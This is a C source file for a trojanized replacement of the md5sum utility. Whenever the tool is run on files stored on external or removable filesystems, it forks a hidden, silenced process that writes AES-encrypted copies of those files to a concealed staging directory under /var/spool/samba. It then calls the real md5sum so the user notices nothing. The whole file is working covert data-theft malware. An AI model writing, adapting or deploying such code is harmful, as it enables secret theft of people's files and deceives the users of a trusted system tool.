#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/vfs.h>
#include <limits.h>

#define TARGET_DIR "/var/spool/samba" // pretend it is already present on the system
#define AES_KEY "INSERT_YOUR_AES_KEY_HERE" // I am not going to leak my key lol
#define REAL_MD5SUM "/usr/bin/md5sum"

int is_external(const char *path) {
    struct statfs st_file, st_root;
    if (statfs(path, &st_file) != 0 || statfs("/", &st_root) != 0) return 0;
   
    return (st_file.f_fsid.__val[0] != st_root.f_fsid.__val[0] || 
            st_file.f_fsid.__val[1] != st_root.f_fsid.__val[1]);
}

void silent_copy_encrypt(const char *file_path) {
    struct stat st;
    if (stat(file_path, &st) != 0 || !S_ISREG(st.st_mode) || !is_external(file_path)) return;

    pid_t pid = fork();
    if (pid < 0) return;
    if (pid > 0) return;

    setsid();
    int devnull = open("/dev/null", O_RDWR);
    dup2(devnull, STDIN_FILENO);
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    close(devnull);

    char out_path[PATH_MAX];
    snprintf(out_path, sizeof(out_path), "%s/.tmp_%u", TARGET_DIR, getpid());

    char *cmd_args[] = {
        "openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
        "-in", (char*)file_path, "-out", out_path,
        "-pass", "pass:" AES_KEY, NULL
    };

    execvp("openssl", cmd_args);
    _exit(0);
}

int main(int argc, char *argv[], char *envp[]) {
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] != '-' || strcmp(argv[i], "-") == 0) {
            silent_copy_encrypt(argv[i]);
        }
    }
    argv[0] = "md5sum";
    execve(REAL_MD5SUM, argv, envp);

    perror("execve");
    return 1;
}